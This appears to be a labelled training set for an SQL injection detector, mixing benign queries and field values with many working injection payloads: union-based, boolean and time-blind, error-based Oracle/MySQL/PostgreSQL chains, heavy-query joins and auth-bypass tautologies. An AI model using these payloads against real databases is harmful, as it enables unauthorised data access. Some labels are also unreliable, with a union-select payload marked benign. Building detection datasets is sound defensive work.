payload_norm,payload_delex,sqli_type,db_engine,confidence,is_attack,source,tier
"select * from users WHERE username = ""-8519%\' ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and username = ""1 ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",select * from __IDENT__ where __IDENT__ = __STR__ __INT__ ) ) and __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ),out_of_band,oracle,0.9,True,original,silver
SELECT length ( s ) FROM anyone INNER JOIN,select length ( __IDENT__ ) from __IDENT__ inner join,benign,generic,1.0,False,original,gold
"1' ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( 'wdru' like 'wdru",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,heavy_query,sqlite,0.9,True,original,silver
SELECT DISTINCT hunter FROM bus,select distinct __IDENT__ from __IDENT__,benign,generic,1.0,False,original,gold
"-8266%' ) union all select 8626,8626,8626,8626,8626,8626--","- __INT__ % ' ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ - -",union_based,generic,0.85,True,original,silver
SELECT DISTINCT baby FROM tin,select distinct __IDENT__ from __IDENT__,benign,generic,1.0,False,original,gold
yasmmane,__IDENT__,benign,generic,0.9,False,original,silver
walter,__IDENT__,benign,generic,0.9,False,original,silver
1' ) ) and ( 3020 = 3020 ) *6703 and ( ( 'pfal' = 'pfal,__INT__ __STR__ __IDENT__ __STR__ __IDENT__,boolean_blind,generic,0.5,True,original,bronze
"select * from users WHERE username = ""-5013\' ) ) ) and ( ( ( \'ehwh\' like \'ehwh"" and username = ""-3458\' ) where 2053 = 2053 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,out_of_band,oracle,0.9,True,original,silver
"1' ) ) as oocd where 2919 = 2919 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --","__INT__ __STR__ __IDENT__ , upper ( hex ( __IDENT__ ( __INT__ / __INT__ ) ) ) ) - -",time_blind,sqlite,0.7,True,original,bronze
pascuala,__IDENT__,benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""1"" or username = ""-6190\' ) where 2621 = 2621 and username = ""-8860 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ - __INT__ ) or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - """,error_based,oracle,0.95,True,original,gold
"select * from users WHERE username = ""1 ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 6395 = 6395"" or username = ""-5217 where 3620 = 3620","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = "" - __INT__ where __INT__ = __INT__",boolean_blind,oracle,0.8,True,original,silver
"select * from users WHERE username = ""1%\' ) ) and username = ""1%\' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( \'%\' = \'""",select * from __IDENT__ where __IDENT__ = __STR__,union_based,oracle,0.95,True,original,gold
-6616 ) order by 1--,- __INT__ ) order by __INT__ - -,union_based,generic,0.7,True,original,bronze
andara francino,__IDENT__ __IDENT__,benign,generic,0.9,False,original,silver
SELECT government FROM regular UNION SELECT exist FROM rope ORDER BY bite,select __IDENT__ from __IDENT__ union select __IDENT__ from __IDENT__ order by __IDENT__,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""-4248 where 3288 = 3288 and username = ""-5585\' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - """,error_based,oracle,0.9,True,original,silver
SELECT COUNT ( park ) FROM title,select count ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False,original,gold
solania,__IDENT__,benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""1\' ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) or username = ""1\' ) ) )",select * from __IDENT__ where __IDENT__ = __INT__ __STR__ ) ) ),boolean_blind,oracle,0.8,True,original,silver
SELECT TOP 3 * FROM receive WHERE follow = 'riding' SELECT * FROM point,select top __INT__ * from __IDENT__ where __IDENT__ = __STR__ select * from __IDENT__,benign,mssql,1.0,False,original,gold
"1 where 5925 = 5925 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --","__INT__ where __INT__ = __INT__ and __INT__ = ( select count ( * ) from __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ ) - -",heavy_query,db2,0.7,True,original,bronze
"select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 and username = ""1\' ) ) and ( ( \'hcpo\' like \'hcpo"" and username = ""1""",select * from __IDENT__ where __IDENT__ = __STR__ __INT__ __STR__ __IDENT__ __STR__ __IDENT__ __STR__ __INT__,auth_bypass,generic,0.7,True,original,bronze
"SELECT * FROM certainly WHERE own NOT IN ( 'your', 'idea', 'pocket' )","select * from __IDENT__ where __IDENT__ not in ( __STR__ , __STR__ , __STR__ )",benign,mysql,0.9,False,original,silver
SELECT * FROM unless WHERE NOT fine = 'comfortable',select * from __IDENT__ where not __IDENT__ = __STR__,benign,generic,1.0,False,original,gold
SELECT closely ( s ) FROM over SELECT basket FROM mission,select __IDENT__ ( __IDENT__ ) from __IDENT__ select __IDENT__ from __IDENT__,benign,mysql,0.9,False,original,silver
"-4280%"" ) ) ) union all select 7981,7981--","- __INT__ % "" ) ) ) union all select __INT__ , __INT__ - -",union_based,generic,0.7,True,original,bronze
SELECT engine FROM began UNION ALL SELECT jet FROM chamber ORDER BY log,select __IDENT__ from __IDENT__ union all select __IDENT__ from __IDENT__ order by __IDENT__,benign,generic,1.0,False,original,gold
SELECT * FROM per WHERE paid NOT LIKE 'ants%',select * from __IDENT__ where __IDENT__ not like __STR__,benign,generic,1.0,False,original,gold
SELECT * FROM basket WHERE per = 'bread' AND ( anyway = 'double' OR gravity = 'central' ),select * from __IDENT__ where __IDENT__ = __STR__ and ( __IDENT__ = __STR__ or __IDENT__ = __STR__ ),benign,generic,1.0,False,original,gold
1 ) ) and sleep ( 5 ) #,__INT__ ) ) and sleep ( __INT__ ) #,time_blind,generic,0.9,True,original,silver
SELECT farm FROM back UNION SELECT were FROM band ORDER BY ran,select __IDENT__ from __IDENT__ union select __IDENT__ from __IDENT__ order by __IDENT__,benign,generic,1.0,False,original,gold
buleje quesada,__IDENT__ __IDENT__,benign,generic,0.9,False,original,silver
despault2,__IDENT__,benign,generic,0.9,False,original,silver
select ( case when ( 4205 = 9574 ) then 4205 else 1/ ( select 0 ) end ) --,select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ / ( select __INT__ ) end ) - -,union_based,generic,0.85,True,original,silver
-3107' ) where 7782 = 7782 or 8571 = 8571--,- __INT__ ) where __INT__ = __INT__ or __INT__ = __INT__ - -,boolean_blind,generic,0.5,True,original,bronze
"select * from users WHERE username = ""1\' ) and ( \'ulkq\' = \'ulkq"" or username = ""1 or username = ""-9770\' ) ) as ovhh where 7903 = 7903 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ - __INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - """,error_based,oracle,0.95,True,original,gold
"1 ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --","__INT__ ) ) and __INT__ = ( select count ( * ) from __IDENT__ __IDENT__ , __IDENT__ __IDENT__ , __IDENT__ __IDENT__ , __IDENT__ __IDENT__ , __IDENT__ __IDENT__ ) - -",heavy_query,oracle,0.7,True,original,bronze
"SELECT * FROM Users WHERE Name = ""John Doe"" AND Pass = ""myPass""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,benign,mysql,0.9,False,original,silver
3.55661E+15,__IDENT__ + __INT__,benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""-6523"" or ( ( ( \'enfe\' like \'enfe"" or username = ""-6036 ) ) )",select * from __IDENT__ where __IDENT__ = __STR__ or ( ( ( \ __STR__ like __IDENT__ __STR__ - __INT__ ) ) ),auth_bypass,generic,0.5,True,original,bronze
SELECT AVG ( hurry ) FROM name SELECT SUM ( phrase ),select avg ( __IDENT__ ) from __IDENT__ select sum ( __IDENT__ ),benign,generic,1.0,False,original,gold
SELECT AVG ( Price ) FROM Products,select avg ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""1\'|| ( select \'vasx\' where 4770 = 4770 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||\'"" or username = ""-4610\' ) ) and ( ( \'hdco\' = \'hdco""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,error_based,oracle,0.9,True,original,silver
"1%' ) union all select null,null,null,null,null,null,null,null,null--","__INT__ % ' ) union all select null , null , null , null , null , null , null , null , null - -",union_based,generic,0.85,True,original,silver
marsh@comerciosaspe.ke,__IDENT__,benign,generic,0.9,False,original,silver
SELECT COUNT ( DISTINCT last ) FROM simple,select count ( distinct __IDENT__ ) from __IDENT__,benign,generic,1.0,False,original,gold
SELECT option_value FROM wp_options WHERE option_name = '_site_transient_wp_wps_bg_non_library_sync_1_process_lock' LIMIT 1,select __IDENT__ from __IDENT__ where __IDENT__ = __STR__ limit __INT__,benign,mysql,0.9,False,original,silver
FROM ( SELECT DISTINCT mile FROM introduced ),from ( select distinct __IDENT__ from __IDENT__ ),benign,generic,1.0,False,original,gold
DELETE FROM at,delete from __IDENT__,benign,generic,1.0,False,original,gold
"-2046' ) union all select 6668,6668--","- __INT__ ) union all select __INT__ , __INT__ - -",union_based,generic,0.7,True,original,bronze
"select * from users WHERE username = ""1 ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 6395 = 6395"" and username = ""-6665\' ) ) )","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = "" - __INT__ ) ) )",boolean_blind,oracle,0.8,True,original,silver
corua del conde,__IDENT__ __IDENT__ __IDENT__,benign,generic,0.9,False,original,silver
SELECT AVG ( upon ) FROM farm SELECT SUM ( dust ),select avg ( __IDENT__ ) from __IDENT__ select sum ( __IDENT__ ),benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""-9295 ) ) ) and 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-1641\' ) ) or username = ""-2756\' where 6156 = 6156 and 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.8,True,original,silver
"1' and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and 'kudh' like 'kudh",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,error_based,mysql,0.9,True,original,silver
"c/ peiscola, 95 3?g","__IDENT__ / __IDENT__ , __INT__ __IDENT__",benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""1%\' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""-2951 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) # gwqv""",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) # __IDENT__,error_based,oracle,0.95,True,original,gold
"select * from users WHERE username = ""1\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""-2374 ) and username = ""-8860 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) and __IDENT__ = __STR__,error_based,oracle,0.95,True,original,gold
"select * from users WHERE username = ""1\' ) ) and ( ( \'ajka\' = \'ajka"" or username = ""1\' )",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __INT__ ),auth_bypass,generic,0.6,True,original,bronze
gianna,__IDENT__,benign,generic,0.9,False,original,silver
"SELECT column_name ( s ) FROM ship,fun","select __IDENT__ ( __IDENT__ ) from __IDENT__ , __IDENT__",benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""-6720\' ) ) ) and ( ( ( \'enfe\' like \'enfe"" and username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'gegg\' = \'gegg""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,boolean_blind,postgresql,0.9,True,original,silver
"1%' or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and '%' = '",__INT__ % __STR__ % __STR__,error_based,mysql,0.7,True,original,bronze
1.93371E+15,__IDENT__ + __INT__,benign,generic,0.9,False,original,silver
zigoitia,__IDENT__,benign,generic,0.9,False,original,silver
"SELECT * FROM planning WHERE loud IN ( 'under', 'way', 'imagine' )","select * from __IDENT__ where __IDENT__ in ( __STR__ , __STR__ , __STR__ )",benign,generic,1.0,False,original,gold
kava_ivic@comercioenlacalle.info,__IDENT__,benign,generic,0.9,False,original,silver
SELECT * FROM cause WHERE atomic = 'plural',select * from __IDENT__ where __IDENT__ = __STR__,benign,generic,1.0,False,original,gold
catchot bacard,__IDENT__ __IDENT__,benign,generic,0.9,False,original,silver
"1"" ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ""nsyl"" = ""nsyl",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,boolean_blind,mysql,0.7,True,original,bronze
marice,__IDENT__,benign,generic,0.9,False,original,silver
"calle camino getafe, 157,","__IDENT__ __IDENT__ __IDENT__ , __INT__ ,",benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""-4262%\' ) ) ) || 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and username = ""-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'wkkp\' like \'wkkp""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.95,True,original,gold
"select * from users WHERE username = ""-6523"" and username = ""1\' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.9,True,original,silver
"-1512 union all select 9013,9013,9013,9013#","- __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__",benign,generic,1.0,False,original,gold
SELECT * FROM bottle WHERE hearing = 'careful' AND ( number = 'table' OR excited = 'consist' ),select * from __IDENT__ where __IDENT__ = __STR__ and ( __IDENT__ = __STR__ or __IDENT__ = __STR__ ),benign,generic,1.0,False,original,gold
94lp90ulo,__IDENT__,benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""1\' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" and ( ( 5139 = 5139"" or username = ""-2348 ) as sige where 1639 = 1639",select * from __IDENT__ where __IDENT__ = __STR__ and ( ( __INT__ = __INT__ __STR__ - __INT__ ) as __IDENT__ where __INT__ = __INT__,error_based,oracle,0.95,True,original,gold
